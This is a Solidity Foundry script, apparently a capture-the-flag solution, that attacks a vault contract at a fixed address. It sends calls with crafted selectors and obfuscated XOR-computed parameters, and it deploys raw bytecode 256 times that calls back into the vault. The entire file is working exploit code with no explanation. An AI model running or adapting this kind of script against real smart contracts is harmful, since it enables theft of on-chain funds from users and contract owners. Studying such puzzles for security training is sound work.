// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract ExploitScript is Script {
    address vaultAddress = 0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8;

    function run() public {
        vm.startBroadcast();

        // 0x41414141
        {
            uint256 param1 = ((0x0346d81803d471 ^ 0xb3abdcef1f1) / uint256(0x80) - 0x069b135a06c3) << 224;
            vaultAddress.call(abi.encodeWithSelector(hex"41414141", param1));
        }

        // 0x43434343
        {
            bytes memory creationCode =
                hex"60568060093d393df369e8000000000000000000624500007f434343430000000000000000000000000000000000000000000000000000000060005260006000600860006000736e4198c61c75d1b4d1cbcd00707aac7d76867cf861fffff1";
            for (int256 i = 0; i < 256; i++) {
                address addr;
                assembly {
                    addr := create(0, add(creationCode, 0x20), mload(creationCode))
                }
            }
        }

        // 0x44444444
        {
            uint256 param1 = 436214393 << 224;
            vaultAddress.call(abi.encodeWithSelector(hex"44444444", param1));
        }

        // 0x45454545
        {
            uint256 param1 = 1021951 << 224;
            vaultAddress.call(abi.encodeWithSelector(hex"45454545", param1));
        }

        // 0x76726679
        {
            uint256 param1 = 0xdeadbeaf << 224;
            vaultAddress.call(abi.encodeWithSelector(hex"76726679", param1));
        }
    }
}
